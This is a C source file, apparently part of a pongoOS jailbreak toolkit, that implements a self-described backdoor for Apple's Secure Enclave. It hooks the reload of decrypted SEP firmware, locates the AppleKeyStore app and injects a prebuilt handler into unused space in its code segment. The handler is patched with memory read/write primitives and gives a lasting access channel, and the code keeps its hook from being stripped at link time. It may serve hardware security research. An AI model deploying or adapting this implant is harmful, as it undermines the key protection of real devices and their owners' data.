/*
 * sepbd.c — scheme C SEP backdoor for pongoOS.
 *
 * Wiring (all of it optional at boot; nothing here changes stock pongo
 * behavior until the hook actually finds the SKS image inside a sepi):
 *
 *   sepfw_kpf_hook = sep_bd_sepfw_hook;   // set from sep_bd_init
 *
 * sep_bd_sepfw_hook runs inside reload_sepi, on the decrypted sepi bytes
 * before they are paged to the SEP. It locates the SKS app by its source
 * path string, writes the v3 handler into the free gap between the SKS
 * load commands and its __text (the placement validated on vphone: the
 * image boots with the blob resident in SKS __TEXT), and patches the two
 * primitive-address sites with pongo's own blackbird wrappers, which are
 * the exact 4-byte read/write primitives the handler was built for.
 *
 * The handler stays dormant unless something routes msgno 0x7BC to it;
 * with the blackbird dispatcher alive, `sep peek`/`sep poke` reach the
 * same memory directly, so the in-image copy is the durable channel for
 * after pongo leaves the picture.
 */

#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>
#include <string.h>
#include <pongo.h>
#include "sep.h"
#include "sepbd_blob.h"

// blackbird wrappers (defined in sep.c, not in sep.h)
extern uint32_t sep_blackbird_read(uint32_t addr);
extern void sep_blackbird_write(uint32_t addr, uint32_t val);

// newlib configs here may lack memmem; keep the discovery self-contained.
static const void *bd_memmem(const void *h, size_t n, const void *needle, size_t m)
{
    if (m == 0) return h;
    if (n < m) return NULL;
    const uint8_t *a = h, *b = needle;
    for (size_t i = 0; i + m <= n; i++)
        if (a[i] == b[0] && memcmp(a + i, b, m) == 0) return a + i;
    return NULL;
}

// The SKS app is identified by a source path only it carries.
static const char kSKSAnchor[] = "AppleKeyStore_SEP/sks.c";

// Find a Mach-O header at or after `from` (returns fw offset, or end).
static size_t next_macho(const uint8_t *fw, size_t from, size_t end)
{
    for (size_t i = from; i + 32 <= end; i += 0x1000) {
        uint32_t magic;
        memcpy(&magic, fw + i, 4);
        if (magic == 0xFEEDFACF) return i;
    }
    return end;
}

// Within the Mach-O at `base`, resolve the __TEXT segment's file mapping and
// return (text_vm, text_fileoff, text_filesz) or false.
static bool macho_text_segment(const uint8_t *fw, size_t base, size_t end,
                               uint64_t *vm, uint64_t *foff, uint64_t *fsz,
                               uint32_t *ncmds_out)
{
    uint32_t ncmds;
    memcpy(&ncmds, fw + base + 16, 4);
    size_t c = base + 32;
    for (uint32_t i = 0; i < ncmds && c + 8 <= end; i++) {
        uint32_t cmd, size;
        memcpy(&cmd, fw + c, 4);
        memcpy(&size, fw + c + 4, 4);
        if (size < 8 || c + size > end) return false;
        if (cmd == 0x19) { // LC_SEGMENT_64
            char name[17];
            memcpy(name, fw + c + 8, 16);
            name[16] = 0;
            if (!strcmp(name, "__TEXT")) {
                memcpy(vm,   fw + c + 24, 8);
                memcpy(foff, fw + c + 40, 8);
                memcpy(fsz,  fw + c + 48, 8);
                if (ncmds_out) *ncmds_out = ncmds;
                return true;
            }
        }
        c += size;
    }
    return false;
}

static size_t find_sks_image(const uint8_t *fw, size_t size)
{
    size_t p = 0;
    while (p < size) {
        size_t m = next_macho(fw, p, size);
        if (m >= size) break;
        uint64_t vm, foff, fsz;
        if (!macho_text_segment(fw, m, size, &vm, &foff, &fsz, NULL)) { p = m + 0x1000; continue; }
        // The image's own bytes for its __TEXT: fw + m + foff .. +fsz
        if (m + foff + fsz <= size) {
            const uint8_t *hay = fw + m + foff;
            size_t hay_len = (size_t)fsz;
            // __cstring lives in __TEXT; search for the anchor there.
            const uint8_t *hit = bd_memmem(hay, hay_len, kSKSAnchor, sizeof(kSKSAnchor) - 1);
            if (hit) return m;
        }
        p = m + 0x1000;
    }
    return (size_t)-1;
}

// Free gap in the image between the end of the load commands and the first
// section (verified on the reference firmware: all zero, page-mapped with __TEXT, RX).
static bool sks_gap(const uint8_t *fw, size_t sks, size_t size,
                    size_t *gap_off, size_t *gap_len)
{
    uint64_t vm, foff, fsz;
    uint32_t ncmds;
    if (!macho_text_segment(fw, sks, size, &vm, &foff, &fsz, &ncmds))
        return false;

    // First section start (lowest section address in __TEXT) — walk sections.
    size_t c = sks + 32;
    uint64_t first_sec = ~0ull;
    for (uint32_t i = 0; i < ncmds && c + 8 <= size; i++) {
        uint32_t cmd, lsize;
        memcpy(&cmd, fw + c, 4);
        memcpy(&lsize, fw + c + 4, 4);
        if (lsize < 8 || c + lsize > size) break;
        if (cmd == 0x19) {
            uint32_t nsects;
            memcpy(&nsects, fw + c + 64, 4);
            if (nsects && 72 + (size_t)nsects * 80 <= lsize) {
                for (uint32_t s = 0; s < nsects; s++) {
                    uint64_t sa;
                    memcpy(&sa, fw + c + 72 + (size_t)s * 80 + 32, 8);
                    if (sa && sa < first_sec) first_sec = sa;
                }
            }
        }
        c += lsize;
    }
    if (first_sec == ~0ull) return false;

    // End of load commands: scan the header region for the last nonzero word
    // before the first section's file offset.
    size_t hdr_end = sks + (size_t)(first_sec - vm); // approx fileoff of section
    size_t last = 0;
    for (size_t o = 32; o + 4 <= hdr_end; o += 4) {
        uint32_t w;
        memcpy(&w, fw + sks + o, 4);
        if (w) last = o + 4;
    }
    size_t start = (last + 3) & ~3u;
    if (start + SEP_BD_BLOB_LEN + 8 > hdr_end) return false; // need blob + marker
    // Require the candidate region to be dead (all zero) before touching it.
    for (size_t o = start; o < hdr_end; o++) if (fw[sks + o]) return false;
    *gap_off = sks + start;
    *gap_len = hdr_end - start;
    return true;
}

// ── the sepfw hook ────────────────────────────────────────────────────
void sep_bd_sepfw_hook(void *sepfw_bytes, size_t sepfw_size)
{
    uint8_t *fw = (uint8_t *)sepfw_bytes;
    size_t sks = find_sks_image(fw, sepfw_size);
    if (sks == (size_t)-1) {
        iprintf("sepbd: SKS image not found, skipping\n");
        return;
    }
    size_t gap_off, gap_len;
    if (!sks_gap(fw, sks, sepfw_size, &gap_off, &gap_len)) {
        iprintf("sepbd: no dead gap in SKS header, skipping\n");
        return;
    }

    // Copy the blob and patch the two primitive sites with pongo's own
    // blackbird wrappers (the exact 4-byte read/write contract).
    uint32_t code[SEP_BD_BLOB_WORDS];
    memcpy(code, k_sep_bd_blob, sizeof code);
    int rs = -1, ws = -1;
    for (int i = 0; i + 3 < SEP_BD_BLOB_WORDS; i++) {
        if (rs < 0 && code[i] == SEP_BD_READ_SITE_INSN) rs = i;
        if (ws < 0 && code[i] == SEP_BD_WRITE_SITE_INSN) ws = i;
    }
    if (rs < 0 || ws < 0) {
        iprintf("sepbd: blob patch sites missing\n");
        return;
    }
    uint32_t prim_read = (uint32_t)(uintptr_t)sep_blackbird_read;
    uint32_t prim_write = (uint32_t)(uintptr_t)sep_blackbird_write;
    for (int k = 0; k < 4; k++) {
        uint32_t addr = k == 0 ? prim_read : prim_write;
        uint32_t reg = k == 0 ? 26 : 25;
        uint32_t *site = k == 0 ? &code[rs] : &code[ws];
        static const uint32_t bases[4] = { 0xD2800000u, 0xF2A00000u, 0xF2C00000u, 0xF2E00000u };
        site[k] = bases[k] | (((addr >> (16 * k)) & 0xFFFFu) << 5) | reg;
    }

    memcpy(fw + gap_off, code, SEP_BD_BLOB_LEN);
    memcpy(fw + gap_off + SEP_BD_BLOB_LEN, "VPBDv4.1", 8);

    // Runtime VA of the handler = SKS __TEXT vmaddr + gap offset in image.
    uint64_t handler_va = 0;
    {
        uint64_t vm2, fo2, fsz2;
        if (macho_text_segment(fw, sks, sks + 0x10000, &vm2, &fo2, &fsz2, NULL))
            handler_va = vm2 + (gap_off - sks);
    }
    iprintf("sepbd: handler %d B @ sepi+%llx (SKS VA %llx), frame %llx\n",
            SEP_BD_BLOB_LEN, (unsigned long long)gap_off,
            (unsigned long long)handler_va,
            (unsigned long long)(handler_va + SEP_BD_BLOB_LEN + 0x10));
}

// ── boot wiring ───────────────────────────────────────────────────────
// Runs as an ELF constructor: registers the firmware hook. The hook only
// acts when a sepi is actually reloaded (sep pwn flow), so an ordinary
// boot carries zero behavior change.
// -dead_strip (and LTO) drop unreferenced constructors; anchor the chain
// through the always-referenced blob table so the hook survives linking.
const void *const sepbd_keep[] __attribute__((used, section("__DATA,__const"))) = {
    (const void *)&k_sep_bd_blob,
    (const void *)sep_bd_sepfw_hook,
};

__attribute__((constructor))
static void sep_bd_init(void)
{
    sepfw_kpf_hook = sep_bd_sepfw_hook;
}
